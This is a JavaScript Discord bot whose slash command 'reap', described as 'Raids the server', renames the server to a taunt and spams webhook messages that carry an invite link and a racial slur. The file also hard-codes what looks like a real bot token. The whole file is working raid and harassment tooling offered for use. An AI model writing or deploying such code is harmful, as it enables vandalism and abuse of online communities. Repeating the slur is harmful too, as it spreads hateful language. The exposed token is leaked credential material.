const { Client, Intents, SlashCommandBuilder } = require('discord.js');
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v9');

const clientId = '1342002628921659455'; // Replace with your bot's client ID
const guildId = '1376506797879463997'; // Replace with your server's guild ID
const token = 'MTM0MjAwMjYyODkyMTY1OTQ1NQ.Gwnrr8.9NuPNhoZXIc2pLTHRwMxcesoBrunfbQMBL3KjI'; // Replace with your bot's token

const client = new Client({ intents: [Intents.FLAGS.GUILDS] });

const commands = [
    new SlashCommandBuilder()
        .setName('reap')
        .setDescription('Raids the server.'),
].map(command => command.toJSON());

const rest = new REST({ version: '9' }).setToken(token);

rest.put(Routes.applicationGuildCommands(clientId, guildId), { body: commands })
    .then(() => console.log('Successfully registered application commands.'))
    .catch(console.error);

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'reap') {
        try {
            await interaction.deferReply({ ephemeral: true }); // Acknowledge the command immediately

            // Change server name
            await interaction.guild.setName('reap on top lil bro');

            // Create webhooks and spam
            const webhookSpam = async () => {
                try {
                    const webhook = await interaction.guild.channels.cache
                        .filter(channel => channel.type === 'GUILD_TEXT') // Only text channels
                        .first() // Get the first text channel
                        .createWebhook('Reaper raided you', {
                            avatar: 'https://i.imgur.com/AfFp7pu.png', // Replace with a reaper image URL
                        });

                    for (let i = 0; i < 10; i++) { // Spam 10 times, adjust as needed
                        await webhook.send('https://discord.gg/TqFhzjmyjx on top nigga!');
                    }
                    await webhook.delete(); // Clean up the webhook after spamming

                } catch (error) {
                    console.error('Error creating/using webhook:', error);
                }
            };

            // Execute webhook spam in all text channels
            for (const channel of interaction.guild.channels.cache.values()) {
                if (channel.type === 'GUILD_TEXT') {
                    webhookSpam(); // Call webhook spam for each text channel.
                }
            }

            await interaction.editReply({ content: 'Reap command executed! Server is being raided.', ephemeral: true });

        } catch (error) {
            console.error('Error executing reap command:', error);
            await interaction.editReply({ content: 'There was an error executing the command!', ephemeral: true });
        }
    }
});

client.login(token);
